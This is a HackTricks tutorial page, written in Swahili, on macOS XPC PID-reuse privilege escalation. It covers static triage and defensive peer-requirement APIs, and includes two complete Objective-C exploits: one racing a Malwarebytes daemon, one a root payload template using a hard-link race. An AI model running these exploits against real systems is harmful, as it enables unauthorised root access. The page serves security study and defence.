# Kutumia Tena PID

{{#include ../../../../../../banners/hacktricks-training.md}}

## Kutumia Tena PID

Wakati **XPC service** ya macOS inathibitisha caller kwa kutafuta **PID** yake badala ya kutumia credentials zilizounganishwa na message iliyopokelewa, inaweza kuwa vulnerable kwa PID reuse attack. Primitive ya kivitendo si kusubiri PID namespace izunguke: attacker hutuma XPC request na mara moja huita **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** ikiwa na `POSIX_SPAWN_SETEXEC`, na kubadilisha process image ya attacker kuwa **allowed binary huku ikihifadhi PID ileile**.<sup>[[1]](#references)[[2]](#references)</sup>

Ikiwa server inatoa request kwenye queue na kisha tu kutafuta PID hiyo ya nambari ili kupata live process kwa ajili ya code-signing, entitlement, path, au parent-process checks, itaona replacement binary badala ya process iliyotuma message. `POSIX_SPAWN_START_SUSPENDED` huweka replacement inayoaminika ikiwa hai na thabiti wakati server inafanya check.<sup>[[1]](#references)[[2]](#references)</sup>

### Kinachoshindaniwa hasa

Mlolongo vulnerable ni **message-identity TOCTOU**, si tu “PIDs zinaweza kurudiwa”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Attacker process huanzisha au kuendelea na XPC connection na kuweka privileged request kwenye queue.
2. Kabla service haijabadilisha PID ya connection kuwa `SecCodeRef` au process object nyingine, attacker hu-overlay process hiyo hiyo kwa approved executable akitumia `POSIX_SPAWN_SETEXEC`.
3. Service huthibitisha approved image iliyopo kwa sasa kwenye PID hiyo, kisha hu-dispatch attacker-controlled request ambayo tayari ilikuwa kwenye queue.

PID bridge yoyote katika authorization data flow inatia shaka: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid`, au `audit_token_to_pid` ikifuatiwa na `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)`, au custom signature verifier. PID inayotumika kwa logging pekee haitoshi; thibitisha kwamba inafika kwenye allow/deny decision. Pia kagua error paths: kujaribu audit-token lookup kwanza lakini **kurudi kwenye PID endapo itashindwa** kunarudisha race hiyo hiyo. Fallback pattern hii ilionekana katika analysis ya 2026 ya privileged XPC services za Intego.<sup>[[3]](#references)</sup>

### Static na dynamic triage ya haraka

Anza kwenye connection handler na ufuatilie kila PID-producing call hadi kwenye code-signing, entitlement, executable-path, au version checks. Commands hizi hutoa first pass ya haraka kwenye helper inayoshukiwa; stripped binaries bado mara nyingi huonyesha imported symbols, Objective-C selectors, au diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Wakati wa jaribio linalodhibitiwa, vunja au hook chanzo cha PID na verifier wake. Hit kwenye `xpc_connection_get_pid` au `-processIdentifier` ni dalili ya kuanzia tu; ushahidi muhimu ni lookup ya baadaye ya **integer hiyo hiyo** baada ya request kupokelewa. Frida pia inaweza ku-hook verifier maalum wa application na privileged selector ili kupima kama selector inatekelezwa wakati PID race inashinda.<sup>[[3]](#references)</sup>

### Mfano wa exploit

Ukipata function **`shouldAcceptNewConnection`** au function inayoitwa nayo inayofanya **calling** **`processIdentifier`** na haifanyi **calling** **`auditToken`**. Kuna uwezekano mkubwa kwamba inathibitisha **PID ya process** na si audit token.\
Kwa mfano katika picha hii (iliyochukuliwa kutoka kwenye reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Angalia exploit hii ya mfano (tena, imechukuliwa kutoka kwenye reference) ili kuona sehemu 2 za exploit:<sup>[[1]](#references)</sup>

- Moja ambayo **hutengeneza fork kadhaa**
- **Kila fork** **itatuma** **payload** kwa XPC service huku ikitekeleza **`posix_spawn`** mara tu baada ya kutuma message.

> [!CAUTION]
> Unapofanya race kwa `fork()` kutoka kwenye process ya Objective-C, zindua exploit kwa `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` ikiwa ime-exportiwa au embed marker ya `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Option ya kwanza ikitumia **`NSTasks`** na argument ya ku-launch children ili ku-exploit RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Mfano huu unatumia **`fork`** ya moja kwa moja kuanzisha **children watakaotumia vibaya PID race condition** na kisha kutumia vibaya **race condition** nyingine kupitia Hard link:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Kufanya race iweze kurudiwa

Pointi zifuatazo za tuning hujitokeza mara kwa mara katika exploits zinazofanya kazi za PID-reuse na majaribio ya hivi karibuni ya privileged-helper:<sup>[[1]](#references)[[3]](#references)</sup>

- Tuma request na uite `posix_spawn` mara moja; **usisubiri** reply. Request lazima iwe tayari imewekwa kwenye queue wakati lookup ya PID ya server inafanyika baada ya image replacement.
- Weka `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` pamoja. Flag ya kwanza huhifadhi PID ya mchakato unaoshiriki kwenye race; ya pili huzuia target halali kutoka au kubadilisha state kabla ya validation.
- Tumia racers kadhaa wanaoishi kwa muda mfupi na urudie sequence kamili ya connection/request/exec. Idadi bora hutegemea target; children wengi kupita kiasi wanaweza kupunguza kasi ya service na kufanya window iwe mbaya zaidi.
- Replacement lazima ikidhi **requirement yote** ya server. Tumia binary halali ya client inapowezekana na ukague designated requirement yake kwanza kwa `codesign -d -r- "/path/to/client.app"`.
- Kwanza ita selector iliyowekwa wazi isiyo na madhara au method ya kusoma pekee. Hii hutenganisha kushinda authentication na kufanikiwa kutumia privileged primitive ya baadaye.

## Kuepuka PID bridge

Kwenye macOS 13+, Foundation hutoa `-[NSXPCConnection setCodeSigningRequirement:]`. Weka peer requirement mara moja tu na **kabla ya** `resume`; requirement strings zenye muundo usio sahihi husababisha exception (au Swift fatal error), na message kutoka kwa peer ambaye hatimizi requirement hubatilisha connection. Hii huwezesha XPC kutekeleza code identity ya peer bila application code kufanya PID resolution.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Kwa API ya kisasa ya low-level listener kwenye macOS 26+, `xpc_listener_set_peer_requirement` hutumia `xpc_peer_requirement_t` iliyothibitishwa wakati listener haifanyi kazi. XPC huacha requests ambazo hazikidhi sharti hilo; peer sessions zinazoundwa kutoka kwa listener **hazirithi** sharti hilo, kwa hivyo tumia pia session requirement inayofaa wakati sessions hizo zina-authorize operations zenye privileged access.<sup>[[7]](#references)</sup>

> [!WARNING]
> Usijaribu “kurekebisha” hili kwa kunakili audit token kisha kuibadilisha kuwa PID kwa ajili ya `SecCode` lookup halisi. Hifadhi identity iliyotokana na audit token wakati wote wa uamuzi wa authorization, au tumia XPC peer-requirement API kutoka mwanzo hadi mwisho.<sup>[[2]](#references)[[6]](#references)</sup> Connection-wide audit-token APIs pia zina aina tofauti ya race, iliyoelezwa katika [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Mifano mingine

- [**Intego X9: Kwa nini macOS antivirus yako haipaswi kuamini PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE dhidi ya privileged helper ya antivirus iliyowa-authenticate clients kwa kutumia PID.<sup>[[3]](#references)</sup>
- [**Kutumia vibaya GOG Galaxy XPC service kwa privilege escalation kwenye macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Sehemu ya II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Jifunze XPC exploitation - Sehemu ya 2: Sema hapana kwa PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Usiiamini PID! Hadithi za logic bug rahisi na mahali pa kuipata - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Kwa nini macOS antivirus yako haipaswi kuamini PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Kutumia vibaya GOG Galaxy XPC service kwa privilege escalation kwenye macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Sehemu ya II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
